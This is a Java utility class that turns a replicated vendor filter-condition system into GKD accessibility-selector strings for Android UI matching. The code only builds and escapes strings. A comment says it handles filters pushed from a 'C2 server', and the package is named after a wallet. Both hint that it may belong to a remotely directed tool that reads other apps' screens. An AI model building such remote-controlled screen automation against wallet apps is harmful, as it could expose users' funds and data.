package com.guard.wallet.gkd;

import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.IntCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.core.AppUtils;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.filter.CombineFiltersWithOr;

import java.util.ArrayList;
import java.util.List;

/**
 * CombineFilter → GKD 选择器字符串转换器。
 *
 * 将 vendor-replica 的 CombineFilter 条件体系运行时转换为 GKD CSS-like 选择器字符串。
 * 用于 C2 服务器下发的动态 filter 和旧代码的渐进迁移。
 *
 * 属性映射:
 *   StringCondition.property "className" → GKD "name"
 *   StringCondition.property "text"      → GKD "text"
 *   StringCondition.property "desc"      → GKD "desc"
 *   StringCondition.property "id"        → GKD "vid"
 *   其他 property                         → 直接使用 (hintText, tooltipText 等, 需 GkdTransform 扩展)
 */
public final class CombineFilterConverter {

    private CombineFilterConverter() {}

    /**
     * 单个 CombineFilter → GKD 选择器。
     * 所有条件用 AND 逻辑组合: [cond1][cond2][cond3]
     *
     * @return GKD 选择器字符串, 或 null 如果 filter 为 null 或无条件
     */
    public static String toGkdSelector(CombineFilter filter) {
        if (filter == null) return null;

        StringBuilder sb = new StringBuilder();

        // StringConditions
        if (filter.getStringConditions() != null) {
            for (StringCondition sc : filter.getStringConditions()) {
                if (sc == null) continue;
                String prop = mapProperty(sc.getProperty());
                if (prop == null) continue;

                if (!AppUtils.B(sc.getEquals())) {
                    sb.append("[").append(prop).append("=\"")
                      .append(escape(sc.getEquals())).append("\"]");
                }
                if (!AppUtils.B(sc.getContains())) {
                    sb.append("[").append(prop).append("*=\"")
                      .append(escape(sc.getContains())).append("\"]");
                }
                if (!AppUtils.B(sc.getPrefix())) {
                    sb.append("[").append(prop).append("^=\"")
                      .append(escape(sc.getPrefix())).append("\"]");
                }
                if (!AppUtils.B(sc.getSuffix())) {
                    sb.append("[").append(prop).append("$=\"")
                      .append(escape(sc.getSuffix())).append("\"]");
                }
                if (!AppUtils.B(sc.getRegex())) {
                    sb.append("[").append(prop).append("~=\"")
                      .append(escape(sc.getRegex())).append("\"]");
                }
            }
        }

        // BoolConditions
        if (filter.getBoolConditions() != null) {
            for (BoolCondition bc : filter.getBoolConditions()) {
                if (bc == null || !bc.isFilterEnabled()) continue;
                if (AppUtils.B(bc.getFilterKey())) continue;
                sb.append("[").append(bc.getFilterKey()).append("=")
                  .append(bc.isFilterValue()).append("]");
            }
        }

        // IntConditions (only == comparison supported by GKD attribute selector)
        if (filter.getIntConditions() != null) {
            for (IntCondition ic : filter.getIntConditions()) {
                if (ic == null || !ic.isFilterEnabled()) continue;
                String key = ic.getFilterKey();
                if (AppUtils.B(key)) continue;
                String compare = ic.getCompare();
                int value = ic.getFilterValue();
                if (compare == null || "==".equals(compare)) {
                    sb.append("[").append(key).append("=").append(value).append("]");
                }
                // !=, >, <, >=, <= not directly supported in GKD attribute selector
                // These remain handled by CombineFilter.matches() fallback
            }
        }

        String result = sb.toString();
        return result.isEmpty() ? null : result;
    }

    /**
     * CombineFiltersWithOr → GKD "selector1 || selector2 || ..." 语法。
     */
    public static String toGkdSelector(CombineFiltersWithOr orFilter) {
        if (orFilter == null || orFilter.getFilters() == null) return null;

        List<String> parts = new ArrayList<>();
        for (CombineFilter cf : orFilter.getFilters()) {
            String s = toGkdSelector(cf);
            if (s != null) parts.add(s);
        }
        if (parts.isEmpty()) return null;
        if (parts.size() == 1) return parts.get(0);

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < parts.size(); i++) {
            if (i > 0) sb.append(" || ");
            sb.append("(").append(parts.get(i)).append(")");
        }
        return sb.toString();
    }

    /**
     * CombineFilterWithChild → GKD "parentSelector >n childSelector" 语法。
     * 使用 >n (任意后代) 而非 > (直接子级), 因为 CombineFilterWithChild
     * 的语义是 "parent 包含 child", child 不一定是直接子级。
     */
    public static String toGkdSelector(CombineFilterWithChild withChild) {
        if (withChild == null) return null;

        String parent = toGkdSelector(withChild.getParentFilter());
        String child = toGkdSelector(withChild.getChildFilter());

        if (parent == null && child == null) return null;
        if (parent == null) return child;
        if (child == null) return parent;

        return parent + " >n " + child;
    }

    // ═══════ 内部工具 ═══════

    /**
     * vendor StringCondition property → GKD 属性名映射。
     */
    private static String mapProperty(String property) {
        if (property == null) return null;
        switch (property) {
            case "className": return "name";
            case "id":        return "vid";
            case "text":      return "text";
            case "desc":      return "desc";
            case "hintText":  return "hintText";
            case "packageName": return "packageName";
            default:          return property;
        }
    }

    /**
     * 转义 GKD 选择器字符串中的特殊字符。
     */
    private static String escape(String value) {
        if (value == null) return "";
        return value.replace("\\", "\\\\").replace("\"", "\\\"");
    }
}
